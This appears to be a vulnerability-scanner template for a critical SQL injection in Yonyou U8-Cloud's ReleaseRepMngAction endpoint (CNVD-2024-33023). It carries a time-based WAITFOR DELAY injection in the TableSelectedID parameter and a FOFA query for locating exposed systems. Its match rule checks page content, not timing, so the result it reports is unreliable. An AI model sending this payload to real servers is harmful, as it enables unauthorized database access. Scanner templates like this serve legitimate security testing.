id: yonyou-u8cloud-ReleaseRepMngAction-sqli
info:
  name: Yonyou U8-Cloud ReleaseRepMngAction SQL Injection
  author: ZacharyZcR
  severity: critical
  description: |
    Yonyou U8-Cloud ReleaseRepMngAction interface has a SQL injection vulnerability (CNVD-2024-33023).
    The vulnerability allows attackers to execute arbitrary SQL statements through maliciously crafted requests.
    FOFA: title=="U8C"
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-Cloud%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3ReleaseRepMngAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CNVD-2024-33023).md

rules:
  r0:
    request:
      method: GET
      path: /service/~iufo/com.ufida.web.action.ActionServlet
      params:
        action: nc.ui.iufo.release.ReleaseRepMngAction
        method: updateDelFlag
        TableSelectedID: "1%27%29%3BWAITFOR+DELAY+%274270%3A0%3A5%27--"
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'iufo/web/javascripts/JSMap.js') &&
      response.body.bcontains(b'iufo/web/javascripts/webExcel.js') &&
      response.headers["Server"].contains("Apache-Coyote")

expression: r0()